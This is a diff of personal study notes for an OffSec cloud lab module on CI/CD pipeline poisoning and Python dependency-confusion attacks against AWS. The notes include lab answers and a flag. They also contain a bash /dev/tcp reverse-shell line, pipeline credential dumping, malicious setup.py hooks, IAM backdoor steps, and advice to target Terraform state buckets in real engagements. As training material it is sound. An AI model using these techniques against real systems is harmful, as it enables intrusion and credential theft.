-- Q2: `B. Usernames and their associated AWS policies`
+> 🔍 Worth remembering generally: Terraform state should be encrypted at rest (SSE-KMS) and have strict bucket policies. In real engagements, any S3 bucket named `tf-state`, `terraform`, or `infra-state` is worth targeting immediately — it's the most reliable single place to find plaintext cloud credentials for the entire infrastructure.
 
-> 🚩 Hands-on, VM spin-up required: Find the flag in an EC2 instance tag using the admin credentials (Goran.B profile). ⬜ Pending
+Lab answers:
+- Q1 (TF state permissions needed): **C — List and read permissions**
+- Q2 (info in TF state about users): **B — Usernames and their associated AWS policies**
+- Q3 (EC2 tag flag): `OS{d66f9ab9e15bac07b1e23a3ec6336706c22bd62e}`
 
 ---
 
-## Attack Chain Diagrams
+## 26.11 Wrapping Up
 
-### Part 1: Poisoned Pipeline
+Clean up personal Kali after the lab:
+
+```bash
+# Reset DNS (if you used nmcli)
+sudo nmcli connection modify "Wired connection 1" ipv4.dns ""
+sudo systemctl restart NetworkManager
+
+# Remove pip config
+rm ~/.pypirc
+rm ~/.config/pip/pip.conf
+
+# Disable SOCKS proxy in Firefox: Settings → Network → No proxy
+```
+
+---
+
+## Full Attack Chain — Scenario 2 (Dependency Chain Abuse)
 
 ```mermaid
 flowchart TD
-    A[S3 bucket\nPublic-accessible] --> B[aws s3 ls\ncross-account auth bypass]
-    B --> C[.git directory\nfull repo in bucket]
-    C --> D[git show\nFix issue commit]
-    D --> E[base64 decode\nadmin credentials]
-    E --> F[Gitea admin\nauthenticated]
-    F --> G[Edit Jenkinsfile\nwithAWS + sh payload]
-    G --> H[Git push\nwebhook fires]
-    H --> I[Jenkins pipeline\nruns poisoned file]
-    I --> J[Reverse shell\non builder]
-    J --> K[env: AWS_ACCESS_KEY_ID\nAWS_SECRET_ACCESS_KEY]
-    K --> L[Backdoor IAM user\nAdministratorAccess]
-```
-
-### Part 2: Dependency Chain
-
-```mermaid
-flowchart TD
-    A[OSINT: forum post\nhackshort-util not on PyPI] --> B[Build malicious package\nversion 1.1.4]
-    B --> C[Publish to\npypi.offseclab.io]
-    C --> D[Production rebuild\npip extra-index-url confusion]
-    D --> E[Python meterpreter\non production root]
-    E --> F[netscan.py\n172.30.0.30:8080 found]
-    F --> G[Jenkins self-reg\ncreate account]
-    G --> H[S3 Explorer plugin\nAWS creds in HTML source]
-    H --> I[s3api list-buckets\ntf-state bucket found]
-    I --> J[terraform.tfstate\nplaintext secrets]
-    J --> K[Goran.B keys\nAdministratorAccess]
+    A[OSINT: forum post reveals\nhackshort_util v1.1.3 dependency] --> B[Create malicious hackshort-util v1.1.4\nmeterpreter payload in utils.py]
+    B --> C[Publish to pypi.offseclab.io\ntwine upload specific tarball]
+    C --> D[Production rebuilds every 10 min\npip installs v1.1.4, imports utils.py]
+    D --> E[Meterpreter session opens\nroot @ production container]
+    E --> G[Enumerate container:\nprintenv → secrets, SQLite → flag, ifconfig → subnets]
+    G --> H[Network scan via netscan.py\n172.18.0.0/24 + 172.30.0.0/24]
+    H --> I[Discover Jenkins at 172.30.0.30:8080\nself-registration enabled]
+    I --> J[MSF SOCKS + route + SSH -L tunnel\nPersonal Kali browser → Jenkins]
+    J --> K[Create Jenkins account\nEnumerate company-dir → S3 Explorer plugin]
+    K --> L[S3 Explorer page source\nawsid + awskey in hidden inputs]
+    L --> M[stolen-s3 profile\ns3api list-buckets → tf-state bucket found]
+    M --> N[Download terraform.tfstate\nplaintext admin keys for Goran.B]
+    N --> O[goran.b profile\nAdministratorAccess confirmed]
+    O --> P[ec2 describe-instances\nflag in EC2 instance tag]
 ```
 
 ---
 
-## Key Techniques Reference
+## Key Gotchas (Lab Notes)
 
-| Technique | Command/Tool | Key Detail |
-|-----------|-------------|-----------|
-| S3 cross-account read | `aws s3 ls <bucket>` | AuthenticatedUsers ACL = any AWS user, not same-account only |
-| Git history secret hunt | `git log` + `git show <hash>` | gitleaks misses diff-removed lines; check "Fix" commits manually |
-| Pipeline credential steal | Jenkinsfile `withAWS` + `sh 'env \| grep AWS'` | Creds loaded as env vars inside the block |
-| Reverse shell in Jenkinsfile | `sh 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" &'` | Must use `sh`, not Groovy; `&` to background |
-| Backdoor IAM | `iam create-user` + `attach-user-policy` | ARN: `arn:aws:iam::aws:policy/AdministratorAccess` |
-| Dep chain version | `~=1.1.0` needs `>=1.1.1, <1.2.0` | Must be higher but compatible; `1.1.4` works |
-| Install-time code exec | `cmdclass={'install': Installer}` in `setup.py` | Fires at `pip install`, not at import |
-| Import-time code exec | `__getattr__` + `sys.excepthook` in `utils.py` | Fires on `from pkg import utils`; suppresses crash |
-| Publish package | `twine upload --repository-url <url>` | Needs `~/.pypirc` or inline `-u/-p` flags |
-| Container pivot scan | `netscan.py` via meterpreter upload | Uses only stdlib `socket`/`ipaddress`/`sys` |
-| MSF pivot chain | SOCKS proxy + `route add` + SSH `-L` | `route add <network> <mask> <session_id>` |
-| Jenkins plugin vuln | S3 Explorer | AWS creds in hidden `<input>` fields, readable in page source |
-| Terraform state exfil | `aws s3 cp s3://tf-state-<x>/terraform.tfstate ./` | Plaintext: user ARNs, key IDs, secrets |
+1. **Leftover dist/ tarballs**: `twine upload dist/*` uploads ALL tarballs in the directory. Old builds have stale LHOST baked in. pip picks the HIGHEST version number. Upload by specific filename.
 
----
+2. **pip doesn't upgrade already-installed versions**: If the container already has 1.1.5 cached, 1.1.4 won't install. Bump the version number on each lab restart.
 
-## External Resources
+3. **Only port 4488 open inbound on cloud Kali**: AWS security group blocks 8080 and 4444. All reverse shells must use 4488.
 
-> 📎 **OWASP Top 10 CI/CD Security Risks:** https://owasp.org/www-project-top-10-ci-cd-security-risks/, canonical reference for all CICD-SEC-x identifiers used in this module
+4. **sqlite3 binary not in container**: Use `python3 -c "import sqlite3; ..."` instead.
 
-> 📎 **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings, covers Python package injection, pipeline attacks, and cloud enumeration chains
+5. **DNS not auto-configured on cloud Kali**: Use `nslookup <host> <DNS_IP>` → `/etc/hosts` rather than assuming the cloud Kali has it.
 
-> 📎 **HackTricks Jenkins (via GitHub):** https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting/pentesting-web/jenkins.md. Jenkins enumeration, Groovy script console RCE, credential extraction
+6. **nc on port 4488 breaks meterpreter**: nc can't speak the meterpreter handshake protocol. Sessions connect and immediately close. Keep msfconsole as the handler.
 
-> 📎 **Hackingthe.cloud:** https://hackingthe.cloud. Nick Frichette's AWS-specific attack reference; covers S3 ACL misconfigs, IAM privesc, and Terraform state file attacks in depth
+7. **Route must be re-added when session ID changes**: When session dies and a new one opens, `route add` must be re-run with the new session ID.
 
----
-
-## Outstanding Sections
-
-- [x] 26.1. About the Public Cloud Labs
-- [x] 26.2. Lab Design (Part 1)
-- [x] 26.3. Enumeration
-- [x] 26.4. Discovering Secrets
-- [x] 26.5. Poisoning the Pipeline
-- [x] 26.6. Compromising the Environment (Backdoor Account)
-- [x] 26.7. Lab Design (Part 2)
-- [x] 26.8. Information Gathering
-- [x] 26.9. Dependency Chain Attack
-- [x] 26.10. Compromising the Environment (Production)
-- [x] 26.11. Wrapping Up
+8. **For Scenario 1**: If the webhook doesn't fire within 30 seconds, check that the commit actually pushed and the webhook URL points to the Jenkins automation server (not localhost).
 
 ---
 
 ## Related Boxes
 
 **Genuine technique overlap:**
-- [[HTB Inject]] — Spring Cloud Function dependency injection: a missing dependency is hijacked by a malicious file in a user-controlled path. Same conceptual chain as pip dep confusion, different language/ecosystem.
-- [[HTB Bucket]] — AWS S3 cross-account access, Lambda privilege chain. Core S3 ACL misconfig patterns from Module 25 feed directly into this module's Part 1.
-- [[HTB Sink]] — Gitea + Flask + AWS Secrets Manager combo. Git credential discovery and Gitea enumeration map cleanly to 26.4.2.
+- [[Jeeves]] (HTB Windows) — Authenticated Jenkins → Groovy script console → RCE → KeePass cracking. Best public match for the Jenkins exploitation techniques in 26.5 and 26.10.4. Path differs (Groovy console vs S3 Explorer plugin leak) but the underlying "authenticated Jenkins = arbitrary code exec" premise is identical. ippsec video: https://www.youtube.com/watch?v=EKGBskG8APc
+- [[GitHappens]] (HTB Linux) — Exposed `.git/` directory on a web server → reconstruct repo with `wget -r` → `git log` + `git show` → credentials in history. Direct technique match for 26.4.2 (discovering secrets in git history). The entire box is built around this one technique.
 
-**Adjacent workflow (container enumeration, internal network pivot):**
-- [[HTB Shoppy]] — Docker container enumeration, credential discovery in app source code, same container escape assessment pattern.
-- [[HTB Registry]] — Docker registry interaction, container privilege assessment.
+**Adjacent workflow (not direct technique):**
+- [[GoodGames]] (HTB Linux) — Docker container + database enumeration as part of the attack chain. Technique adjacency: container discovery and internal pivot. The database access method differs (SQLi dump vs container file access), so treat it as mindset overlap rather than direct practice.
 
-> ℹ️ Full CI/CD pipeline poisoning boxes are rare in public labs (HTB/PG) because they require full infrastructure: SCM server + automation server + custom app + cloud accounts. The technique is well-covered in OWASP Top 10 CI/CD and this Offsec module but rarely reproducible in single-box format. Closest public analogues: HTB Inject (dep chain concept), HTB Forge (SSRF-to-internal-service pivot mirrors the Jenkins pivot in Part 2).
+**Why CI/CD, Dependency Confusion, and Terraform are scarce in public labs:**
+- Dependency Confusion requires a private package registry running alongside a public index — no standard HTB/PG machine sets this up. It's a real-world SaaS/cloud pattern that lives exclusively in environments like OffSec's cloud labs or actual enterprise environments.
+- Terraform state files are cloud-infrastructure-specific. Public lab VMs don't have an AWS account or Terraform-managed infrastructure behind them.
+- Full CI/CD pipelines (Gitea + Jenkins + build agents + private PyPI) require multi-container orchestration that single-VM HTB machines can't replicate. OffSec's cloud labs are the only practical venue for hands-on practice of these techniques.
 
 ---
 
-#### Tags: #Module26 #AWS #CICD #PipelinePoisoning #DependencyChain #Jenkins #Gitea #S3 #Python #Terraform #CloudSecurity
+## External Resources
+
+- [HackTricks — Jenkins (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cicd/jenkins/)
+- [HackTricks — Dependency Chain Abuse (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cicd/dependency-chain-abuse.md)
+- [HackTricks — AWS S3 Attacks (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cloud/aws-security/aws-services/aws-s3-athena-glue-emr-and-other-storage-attacks.md)
+- [HackTricks — AWS IAM PrivEsc (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cloud/aws-security/aws-privilege-escalation/)
+- [PayloadsAllTheThings — Cloud AWS Pentest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest.md)
+- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
+- [RevShells — bash reverse shell generator](https://www.revshells.com)
+- [ippsec.rocks — Jenkins machines](https://ippsec.rocks/?#jenkins)
+- [ippsec.rocks — Jeeves walkthrough (YouTube)](https://www.youtube.com/watch?v=EKGBskG8APc)
+
+---
+
+## Tags
+
+#CICD #DependencyConfusion #DependencyChainAbuse #PoisonedPipeline #PPE #AWS #S3 #Terraform #Jenkins #Gitea #Meterpreter #PythonPayload #SOCKSProxy #SSHTunnel #ContainerEnumeration #NetworkPivot #CloudPrivEsc #IAM #EC2 #GitLeaks #BackdoorAccount
